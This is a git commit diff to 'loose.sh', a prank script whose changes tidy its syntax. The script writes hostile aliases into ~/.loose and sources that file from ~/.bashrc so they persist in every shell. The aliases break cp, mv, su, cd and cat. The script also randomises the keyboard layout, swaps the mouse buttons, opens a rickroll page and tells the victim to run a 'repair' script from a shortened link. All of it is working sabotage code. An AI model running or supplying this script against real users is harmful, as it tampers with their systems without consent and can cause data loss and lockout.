d0b21a59856b7375cd5b6f498d19685c4ca1873f
Manfred Touron <m@42.am>
2015-11-25 12:02:05 +0100

    Fix syntax (fix #5)

--- loose.sh
+++ loose.sh
@@ -1,28 +1,42 @@
 #!/bin/sh
 
+
 cat <<EOF > ~/.loose
+# aliases
 alias vim=emacs
 alias cd=ls
 alias cat=rev
 alias cp=yes
 alias mv=yes
 alias su=yes
-
 alias scp="echo JE SUIS UN GLAND"
 
-google-chrome rickroll.fr     2&>/dev/null
-{if hash localctl; then
-    setxkbmap $(localectl list-keymaps | shuf -n 1)
-else
-    setxkbmap dvorak
-fi; } 2> /dev/null
-xset mouse 3 0                2&>/dev/null
-xmodmap -e "pointer = 3 2 1"  2&>/dev/null
+# rickrolled
+(
+    hash google-chrome && (
+        google-chrome rickroll.fr
+    ) || true
+) 2>/dev/null
+
+# change keyboard layout
+(
+    hash localectl && (
+	setxkbmap \`localectl list-keymaps | shuf -n 1\`
+    ) || setxkbmap dvorak || true
+) 2>/dev/null
+
+# mouse
+(
+    xset mouse 3 0 || true
+    xmodmap -e "pointer = 3 2 1" || true
+) 2>/dev/null
+
 echo "You've been hacked!"
 echo "  You are now using a randomly chosen keyboard (or dvorak)"
 echo "  To 'repair' your computer, you need to undo everything in ~/.loose file"
 echo "  Or execute this script: http://j.mp/wiiiiiin"
 echo "Tchuss"
+
 EOF
 
 grep .loose ~/.bashrc 2>/dev/null || echo "source ~/.loose" >> ~/.bashrc
